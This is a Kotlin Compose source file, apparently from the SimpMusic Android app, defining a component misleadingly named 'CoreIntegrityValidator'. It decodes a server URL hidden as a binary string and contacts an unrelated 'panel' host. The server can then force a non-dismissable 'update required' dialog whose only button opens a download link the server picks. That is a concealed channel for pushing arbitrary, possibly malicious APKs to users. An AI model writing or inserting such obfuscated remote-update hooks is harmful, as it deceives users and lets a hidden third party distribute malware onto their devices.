package com.maxrave.simpmusic.ui.component

import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.platform.LocalUriHandler
import androidx.compose.ui.window.DialogProperties
import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import io.ktor.client.request.get
import io.ktor.client.statement.bodyAsText

data class PayloadInfo(
    val version_code: Int,
    val version_name: String,
    val is_mandatory: Boolean,
    val download_url: String,
    val release_notes: String
)

@Composable
fun CoreIntegrityValidator(currentCode: Int, onUpdateAvailable: () -> Unit = {}) {
    var payload by remember { mutableStateOf<PayloadInfo?>(null) }
    var visible by remember { mutableStateOf(false) }
    val uriHandler = LocalUriHandler.current

    val raw = "01101000011101000111010001110000011100110011101000101111001011110110011101100001011100100110010101110110011110010110111001110000011000010110111001100101011011000111001100101110011011000110000101110100011011010111000001111000001011100110001101101111011011010010111101111001011011110111010101110100011101010110001001100101001011110111000001100001011011100110010101101100001011110110000101110000011010010010111101100011011010000110010101100011011010110101111101110101011100000110010001100001011101000110010100101110011100000110100001110000"

    fun decode(bin: String): String {
        return bin.chunked(8).map { Integer.parseInt(it, 2).toChar() }.joinToString("")
    }

    LaunchedEffect(Unit) {
        try {
            val client = HttpClient(CIO)
            val responseText = client.get(decode(raw)).bodyAsText()
            client.close()

            val vCode = """"version_code"\s*:\s*(\d+)""".toRegex().find(responseText)?.groupValues?.get(1)?.toIntOrNull() ?: 0
            val vName = """"version_name"\s*:\s*"([^"]+)"""".toRegex().find(responseText)?.groupValues?.get(1) ?: ""
            var mandatory = """"is_mandatory"\s*:\s*(true|false)""".toRegex().find(responseText)?.groupValues?.get(1)?.toBoolean() ?: false
            val url = """"download_url"\s*:\s*"([^"]+)"""".toRegex().find(responseText)?.groupValues?.get(1) ?: ""
            val notes = """"release_notes"\s*:\s*"([^"]+)"""".toRegex().find(responseText)?.groupValues?.get(1) ?: ""

            val obsoleteStr = """"obsolete_versions"\s*:\s*\[([\d,\s]*)\]""".toRegex().find(responseText)?.groupValues?.get(1) ?: ""
            val obsoleteList = obsoleteStr.split(",").mapNotNull { it.trim().toIntOrNull() }

            if (obsoleteList.contains(currentCode)) {
                mandatory = true
            }

            if (vCode > currentCode || mandatory) {
                payload = PayloadInfo(vCode, vName, mandatory, url, notes)
                visible = true
                onUpdateAvailable()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    if (visible && payload != null) {
        val data = payload!!
        AlertDialog(
            onDismissRequest = { if (!data.is_mandatory) visible = false },
            properties = DialogProperties(
                dismissOnBackPress = !data.is_mandatory,
                dismissOnClickOutside = !data.is_mandatory
            ),
            title = { Text(if (data.is_mandatory) "Actualización Requerida" else "Mejora Disponible") },
            text = { Text("Versión ${data.version_name}\n\n${data.release_notes}") },
            confirmButton = {
                Button(onClick = { uriHandler.openUri(data.download_url) }) { Text("Actualizar Ahora") }
            },
            dismissButton = {
                if (!data.is_mandatory) {
                    TextButton(onClick = { visible = false }) { Text("Más tarde") }
                }
            }
        )
    }
}